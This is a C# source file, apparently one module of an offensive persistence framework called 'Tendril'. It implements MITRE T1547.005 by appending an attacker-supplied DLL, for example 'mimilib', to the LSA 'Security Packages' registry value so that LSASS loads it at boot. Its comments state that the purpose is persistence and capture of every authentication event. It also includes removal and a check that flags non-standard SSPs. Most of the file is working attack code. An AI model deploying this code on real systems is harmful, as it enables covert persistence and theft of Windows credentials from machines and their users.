using System;
using System.Collections.Generic;
using System.Linq;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Security Support Provider Persistence (T1547.005)
    ///
    /// SSP DLLs are loaded directly by LSASS at boot. Once inside LSASS, the
    /// DLL can intercept every authentication event (NTLM, Kerberos, WDigest).
    ///
    /// Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
    /// The value is a multi-string - append your DLL name (no extension).
    /// DLL must be in System32.
    ///
    /// Requires admin. Extremely high-value persistence + credential capture.
    /// </summary>
    public class SecuritySupportProvider : ITendril
    {
        public string Name { get { return "SecuritySupportProvider"; } }
        public string Description { get { return "LSASS Security Support Provider - DLL loaded by LSASS at boot"; } }
        public string MitreId { get { return "T1547.005"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string LsaPath = @"SYSTEM\CurrentControlSet\Control\Lsa";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<dll_name_no_ext> (e.g. mimilib)");

            // Strip .dll extension if provided
            if (payload.ToLower().EndsWith(".dll"))
                payload = payload.Substring(0, payload.Length - 4);

            try
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(LsaPath, true);
                if (key == null)
                    return new TendrilResult(ResultStatus.Failed, Name, "Cannot open Lsa key");

                string[] existing = key.GetValue("Security Packages") as string[];
                if (existing == null) existing = new string[0];

                if (existing.Contains(payload, StringComparer.OrdinalIgnoreCase))
                    return new TendrilResult(ResultStatus.Warning, Name, "SSP already registered: " + payload);

                var updated = existing.ToList();
                updated.Add(payload);
                key.SetValue("Security Packages", updated.ToArray(),
                    Microsoft.Win32.RegistryValueKind.MultiString);
                key.Close();

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("SSP registered: {0} (reboot to load)", payload))
                    .WithMeta("DLLName", payload)
                    .WithMeta("Note", "DLL must exist in C:\\Windows\\System32. Reboot required.");
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "SSP registration failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string payload;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing /payload:<dll_name_no_ext>");

            if (payload.ToLower().EndsWith(".dll"))
                payload = payload.Substring(0, payload.Length - 4);

            try
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(LsaPath, true);
                if (key == null) return new TendrilResult(ResultStatus.Failed, Name, "Cannot open Lsa key");

                string[] existing = key.GetValue("Security Packages") as string[];
                if (existing == null) return new TendrilResult(ResultStatus.Warning, Name, "No SSPs registered");

                var updated = existing.Where(s => !s.Equals(payload, StringComparison.OrdinalIgnoreCase)).ToArray();
                key.SetValue("Security Packages", updated, Microsoft.Win32.RegistryValueKind.MultiString);
                key.Close();

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("SSP removed: {0} (reboot to take effect)", payload));
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "SSP removal failed: " + ex.Message);
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            var known = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u",
                "cloudAP", "negoextender", "\"\"", ""
            };

            try
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(LsaPath);
                if (key == null) return results;
                string[] packages = key.GetValue("Security Packages") as string[];
                if (packages == null) return results;

                foreach (string pkg in packages)
                {
                    if (string.IsNullOrEmpty(pkg.Trim())) continue;
                    if (!known.Contains(pkg.Trim()))
                    {
                        results.Add(new TendrilResult(ResultStatus.Warning, Name,
                            string.Format("Non-standard SSP: {0}", pkg))
                            .WithMeta("Package", pkg));
                    }
                }
            }
            catch { }
            return results;
        }
    }
}
